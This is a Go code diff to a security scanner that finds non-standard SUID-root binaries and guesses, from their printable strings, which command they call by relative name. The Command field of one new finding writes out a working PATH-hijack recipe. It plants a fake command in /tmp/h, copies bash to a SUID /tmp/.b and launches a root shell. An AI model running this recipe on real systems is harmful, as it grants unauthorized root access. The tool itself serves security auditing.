@@ -2,7 +2,9 @@ package scan
 
 import (
 	"encoding/binary"
+	"io"
 	"io/fs"
+	"os"
 	"path/filepath"
 	"strings"
 	"syscall"
@@ -133,6 +135,22 @@ func suidFinding(path string, mode fs.FileMode) Finding {
 			Reference:   "https://gtfobins.github.io/",
 		}
 	}
+	// Non-standard SUID binary with no GTFOBins entry: inspect its strings for a
+	// command it likely calls by relative name (a PATH-hijack candidate).
+	if mode&fs.ModeSetuid != 0 {
+		if cmd, ok := analyzeSuidPathHijack(path); ok {
+			return Finding{
+				Check:       "filesystem",
+				Title:       "Non-standard SUID-root " + base + " — likely PATH hijack via '" + cmd + "'",
+				Category:    "suid",
+				Confidence:  ConfMedium,
+				BlastRadius: BlastReversible,
+				Evidence:    path + " references '" + cmd + "' with no absolute path (looks invoked via PATH)",
+				Command:     "# " + base + " appears to call '" + cmd + "' by relative name. Hijack it:\n#   mkdir -p /tmp/h; printf '#!/bin/sh\\ncp /bin/bash /tmp/.b; chmod +s /tmp/.b\\n' > /tmp/h/" + cmd + "; chmod +x /tmp/h/" + cmd + "\n#   PATH=/tmp/h:$PATH " + path + " ; /tmp/.b -p",
+				Reference:   "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid-binary-with-command-path",
+			}
+		}
+	}
 	return Finding{
 		Check:       "filesystem",
 		Title:       "Non-standard " + bit + "-root binary " + base + " — investigate",
@@ -143,6 +161,71 @@ func suidFinding(path string, mode fs.FileMode) Finding {
 		Command:     "# no bundled GTFOBins entry — check its behavior; it may call helpers by relative path (PATH hijack)",
 		Reference:   "https://gtfobins.github.io/",
 	}
+}
+
+// commonHijackable are commands frequently invoked by relative name from SUID
+// wrapper programs (via system()/execvp), making them PATH-hijack candidates.
+var commonHijackable = []string{
+	"service", "systemctl", "ps", "id", "ls", "cat", "cp", "mv", "chmod",
+	"chown", "ip", "ifconfig", "netstat", "curl", "wget", "apache2ctl",
+}
+
+// analyzeSuidPathHijack reads a binary's printable strings and returns a command
+// it appears to invoke by relative name (and whose absolute form is absent),
+// which is a strong indicator of a PATH-hijack opportunity. Heuristic, so the
+// finding is reported as medium confidence.
+func analyzeSuidPathHijack(path string) (cmd string, ok bool) {
+	strs, err := readStrings(path, 3, 4<<20) // scan up to 4 MiB
+	if err != nil {
+		return "", false
+	}
+	hasAbs := map[string]bool{}
+	firstWords := map[string]bool{}
+	for _, s := range strs {
+		fields := strings.Fields(s)
+		if len(fields) == 0 {
+			continue
+		}
+		if strings.HasPrefix(fields[0], "/") {
+			hasAbs[baseName(fields[0])] = true
+		}
+		firstWords[fields[0]] = true
+	}
+	for _, cand := range commonHijackable {
+		if firstWords[cand] && !hasAbs[cand] {
+			return cand, true
+		}
+	}
+	return "", false
+}
+
+// readStrings extracts runs of printable ASCII (>= minLen) from the first
+// maxBytes of a file. Pure-Go replacement for shelling out to strings(1).
+func readStrings(path string, minLen, maxBytes int) ([]string, error) {
+	f, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer f.Close()
+	buf := make([]byte, maxBytes)
+	n, _ := io.ReadFull(f, buf) // a short read (ErrUnexpectedEOF/EOF) is fine
+	data := buf[:n]
+	var out []string
+	var cur []byte
+	for _, b := range data {
+		if b >= 0x20 && b < 0x7f {
+			cur = append(cur, b)
+			continue
+		}
+		if len(cur) >= minLen {
+			out = append(out, string(cur))
+		}
+		cur = cur[:0]
+	}
+	if len(cur) >= minLen {
+		out = append(out, string(cur))
+	}
+	return out, nil
 }
 
 func capFinding(path string, perm uint64, eff bool) (Finding, bool) {
